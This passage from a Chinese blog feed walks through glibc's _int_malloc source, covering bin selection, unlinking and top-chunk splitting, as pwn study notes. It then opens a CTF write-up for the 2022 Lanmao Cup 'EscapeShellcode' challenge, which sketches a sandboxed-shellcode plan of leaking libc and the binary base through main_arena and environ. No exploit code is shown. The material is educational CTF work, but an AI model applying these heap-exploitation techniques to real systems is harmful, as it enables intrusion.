<li><p>若 chunk 属于 fast_bin，则依次获取 fast_bin 与 size 对应的 index、该 index 对应 fast bin 处于的 arena 中的位置、该 fast_bin 对应链表的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">idx = fastbin_index (nb);</span><br><span class="line">mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">mchunkptr pp = *fb;</span><br></pre></td></tr></table></figure></li>
<li><p>遍历尾指针的 fd 获取 fast_bin 的头指针，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    victim = pp;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) != victim);</span><br></pre></td></tr></table></figure></li>
<li><p>若该 fast_bin 不为空，则会最后再检查，被检查的数据包括 arena、chunk_size、index。若通过则返回 mem_chunk 地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">		errout:</span><br><span class="line">		alloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	check_remalloced_chunk (av, victim, nb);</span><br><span class="line">	<span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>若不属于 fast_chunk 范围，则进入 small_bins 的相关检查与分配</p>
<ul>
<li><p>检查是否属于 small_chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br></pre></td></tr></table></figure></li>
<li><p>若 chunk 属于 small_bin，则依次获取对应 small_bin 的 index、该 index 所对应的链表的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br></pre></td></tr></table></figure></li>
<li><p>获取该 small_bin 的首指针，并判断该 small_bin 是否不为空(为空则<code>last(bin)=bin-&gt;bk=bin</code>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br></pre></td></tr></table></figure></li>
<li><p>判断该 small_bin 是否存在，不存在则进行初始化(不存在即未初始化，arena 中是空的)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">	malloc_consolidate (av);</span><br></pre></td></tr></table></figure></li>
<li><p>存在则接着会进行一次检测，检测<code>bck-&gt;fd=victim-&gt;bk-&gt;fd==victim</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">&#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>设置该 small_chunk 对应的 inuse 位，并将该 small_chunk 从对应 small_bin 中取出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure></li>
<li><p>接着判断该 arena 是否属于 main_arena，最后再通过一次大小的检查，才会返回 mem_chunk 的地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></li>
<li><p>若不属于 small_chunk，则一定属于 large_chunk，因此获取对应 index，然后查看 arena 中是否有 fast_chunk，有则调用一次 consolidate(合并空闲 fast_chunks)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	idx = largebin_index (nb);</span><br><span class="line">	<span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">		malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>接着进入 unsorted_bin 相关的各种操作，这些操作被放入一个循环中。</p>
<ul>
<li><p>获取 unsorted bin 的头指针，并且判断此时 unsorted bin 是否为空</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br></pre></td></tr></table></figure></li>
<li><p>不为空，则进入循环，首先获取 victim 的 bk 指针，接着对 victim 的大小进行检查，通过则获取该大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>, hunk2mem (victim), av);</span><br><span class="line">size = chunksize (victim);</span><br></pre></td></tr></table></figure></li>
<li><p>依次判断所申请 chunk_size 是否属于 small_chunk 范围、bck 是否属于 unsorted_bin、victim 是否属于 last_remainder、victim_size 是否大于所申请 chunk_size+MINSIZE</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></li>
<li><p>满足，则从 last_remainder 中切割，并将 remainder 重新分配给 small_bin or large_bin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder_size = size - nb;</span><br><span class="line">remainder = chunk_at_offset (victim, nb);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">av-&gt;last_remainder = remainder;</span><br><span class="line">remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">&#123;</span><br><span class="line">	remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></li>
<li><p>若不属于 last_remainder，则从 unsorted_bin 中取出 victim</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></li>
<li><p>接着判断大小是否刚好合适</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (size == nb)</span><br></pre></td></tr></table></figure></li>
<li><p>合适则直接分配给用户</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_inuse_bit_at_offset (victim, size);</span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></li>
<li><p>若以上仍未返回 chunk，则会将 unsorted_bin 中剩余的 chunk 分配到 small_bin 和 large_bin 中，先是 small_bin 的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">&#123;</span><br><span class="line">	victim_index = smallbin_index (size);</span><br><span class="line">	bck = bin_at (av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>否则，再是 larege_bin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	victim_index = largebin_index (size);</span><br><span class="line">	bck = bin_at (av, victim_index);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure></li>
<li><p>但在这个过程中，比之上一步分配到 small_bin 中的过程。由于相较于 small_chunk， large_chunk 还有两个 next_size 属性。因此若该 large_bin 不为空，则还需要将 victim 链表插入到正确链表中。在 large_bin 中遍历直到某个 chunk 的大小刚好等于 victim，则无需设置 next_size，待之后直接插入该链表末尾即可；或刚好小于 victim，则将 victim 所处的链表插于其后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">	size |= PREV_INUSE;</span><br><span class="line">	<span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">	assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">	&#123;</span><br><span class="line">		fwd = bck;</span><br><span class="line">		bck = bck-&gt;bk;</span><br><span class="line">		victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">		&#123;</span><br><span class="line">			fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">			<span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">			fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			victim-&gt;fd_nextsize = fwd;</span><br><span class="line">			victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">			fwd-&gt;bk_nextsize = victim;</span><br><span class="line">			victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">		&#125;</span><br><span class="line">		bck = fwd-&gt;bk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>若该 larege_bin 为空，则直接插入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">	victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>最后插入 victim</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></li>
<li><p>最后设置了这个循环的最大循环次数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">	<span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>将 unsorted_bin 中的 chunk 分配到其他 bins 中后，才会从 large_bin 中取出 chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>获取 main_arena 中的位置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bin = bin_at (av, idx);</span><br></pre></td></tr></table></figure></li>
<li><p>对该 large_bin 进行检查，是否为空或是所申请的 size 大于该 bins 中最大的 chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br></pre></td></tr></table></figure></li>
<li><p>满足条件则从后向前遍历该 bin，直至找出一个 next_size 链表对应的大小大于申请的 size</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = victim-&gt;bk_nextsize;</span><br><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">    victim = victim-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure></li>
<li><p>尽量从链表的末尾取出 chunk，避免多余的变动(最后一个 next_size 链表除外)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Avoid removing the first entry for a size so that the skip list does not have to be rerouted.  */</span></span><br><span class="line"><span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">	victim = victim-&gt;fd;</span><br></pre></td></tr></table></figure></li>
<li><p>获得 remainder_size，同时取出 victim</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder_size = size - nb;</span><br><span class="line">unlink (av, victim, bck, fwd);</span><br></pre></td></tr></table></figure></li>
<li><p>检查 remainder_size 是否小于 MINSIZE，小于则不切割直接分配出去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Exhaust */</span></span><br><span class="line"><span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">&#123;</span><br><span class="line">	set_inuse_bit_at_offset (victim, size);</span><br><span class="line">	<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>否则，就对 victim 进行切割，剩余部分划入 unsorted_bin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Split */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	remainder = chunk_at_offset (victim, nb);</span><br><span class="line">	<span class="comment">/* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here.  */</span></span><br><span class="line">	bck = unsorted_chunks (av);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	&#123;</span><br><span class="line">		errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	remainder-&gt;bk = bck;</span><br><span class="line">	remainder-&gt;fd = fwd;</span><br><span class="line">	bck-&gt;fd = remainder;</span><br><span class="line">	fwd-&gt;bk = remainder;</span><br><span class="line">	<span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">	&#123;</span><br><span class="line">		remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">		remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	set_foot (remainder, remainder_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>最后，将 victim 分配出去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>若还没将 chunk 分配出去，则在从下一个更大的 large_bin (对应更大的 idx)中获取</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>再次进入一个循环，首先检查 bit 的正确性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">	<span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>若 bit 正确，则遍历 binmap，直至遇到不为空的 large_bin，接着获得该 bin 处于 arena 中的位置，并设置 bit 为 1；若都为空，则跳过整个循环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">		<span class="keyword">goto</span> use_top;</span><br><span class="line">&#125;<span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">bit = <span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>通过 bit 来确定 map 的最高位</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	bin = next_bin (bin);</span><br><span class="line">	bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	assert (bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>获取该 bin 的最后一个 chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">victim = last (bin);</span><br></pre></td></tr></table></figure></li>
<li><p>若该 bin 为空，则换下一个 bin，bit 也改变</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (victim == bin)</span><br><span class="line">&#123;</span><br><span class="line">	av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">	bin = next_bin (bin);</span><br><span class="line">	bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>不为空，则获取该 chunk_size、remainder_size，并将 victim 取出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">	assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">	remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* unlink */</span></span><br><span class="line">	unlink (av, victim, bck, fwd);</span><br></pre></td></tr></table></figure></li>
<li><p>接下来就是将 remainer 分配出去的过程</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Exhaust */</span></span><br><span class="line"><span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">&#123;</span><br><span class="line">	set_inuse_bit_at_offset (victim, size);</span><br><span class="line">	<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Split */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here.  */</span></span><br><span class="line">	bck = unsorted_chunks (av);</span><br><span class="line">	fwd = bck-&gt;fd;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	&#123;</span><br><span class="line">		errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	remainder-&gt;bk = bck;</span><br><span class="line">	remainder-&gt;fd = fwd;</span><br><span class="line">	bck-&gt;fd = remainder;</span><br><span class="line">	fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* advertise as last remainder */</span></span><br><span class="line">	<span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">		av-&gt;last_remainder = remainder;</span><br><span class="line">	<span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">	&#123;</span><br><span class="line">		remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">		remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">	set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">	set_foot (remainder, remainder_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>然后返回 mem_chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>至此，整个 bins 的大循环结束，若仍未返回，则会使用 top_chunk 来分出 chunk</p>
<ul>
<li><p>获取 top_chunk 与 top_chunk_size</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br></pre></td></tr></table></figure></li>
<li><p>判断 top_chunk，是否满足申请大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></li>
<li><p>满足则进行 remainder 的切割分配</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">remainder_size = size - nb;</span><br><span class="line">remainder = chunk_at_offset (victim, nb);</span><br><span class="line">av-&gt;top = remainder;</span><br><span class="line">set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure></li>
<li><p>不满足，则会检查是否含有 fast_chunk。并合并 fast_chunks，获取所申请的 chunk_size 对应的 idx</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">&#123;</span><br><span class="line">	malloc_consolidate (av);</span><br><span class="line">	<span class="comment">/* restore original bin index */</span></span><br><span class="line">	<span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">		idx = smallbin_index (nb);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		idx = largebin_index (nb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>若无 fast_bin 为空，则调用 sysmalloc，再次申请一块内存来分配，并作为新的 top_chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">	<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">		alloc_perturb (p, bytes);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p>若分配不成功，则会再次寻找可用 arena，调用 _int_malloc，最后释放 arena。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>申请 chunk 的大小不属于 small_chunk 的范围则会合并空闲 fast_chunks</p>
</li>
<li><p>top_chunk 不满足分配会合并空闲 fast_chunks</p>
</li>
<li><p>unsorted_bin 的循环再被执行时，会将其中的 chunks 分配到 small_bins 和 large_bins 中</p>
</li>
<li><p>unsorted_bin 中分配 chunk，先从 last_remainder 中分配，接着是 small_bins，然后是 unsorted_bin，最后是 large_bins</p>
</li>
<li><p>bins 中以 bin-&gt;fd 为第一个 chunk，bin-&gt;bk 为最后一个 chunk</p>
</li>
<li><p>从 fast_bin 中分配时，会遍历 fd，即从尾开始(FILO)；</p>
<p>从 small_bin 中分配时，会遍历 bk，即从头开始(FIFO)；</p>
<p>从 unsorted_bin 中分配时，会遍历 bk，即从头开始(FIFO)；</p>
<p>从 large_bin 中分配时，会遍历 fd，即从尾开始(FILO)；</p>
</li>
<li><p>从 large_bin 中申请 chunk 时，是从后向前遍历查询，即 next_size 从后向前依次增大</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>笔记</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯2022初赛_pwn_wp</title>
    <url>/2022/07/13/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-pwn-wp/</url>
    <content><![CDATA[<!-- 还是太菜 -->

<span id="more"></span>

<h2 id="EscapeShellcode"><a href="#EscapeShellcode" class="headerlink" title="EscapeShellcode"></a>EscapeShellcode</h2><p>对于汇编代码的运用还是没有融会贯通，以至于编写 shellcode 时并没有第一时间想出。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>只有 canary 没开启</p>
<p>执行 shellcode，由于沙盒保护，只能使用 write 将 flag 输出，因此我们需要泄露 BINARY_BASE，可以通过 heap 上的 main_arena 泄露 libc 版本，拿到 environ 中的地址，在通过栈上的地址拿到 BINARY_BASE。</p>
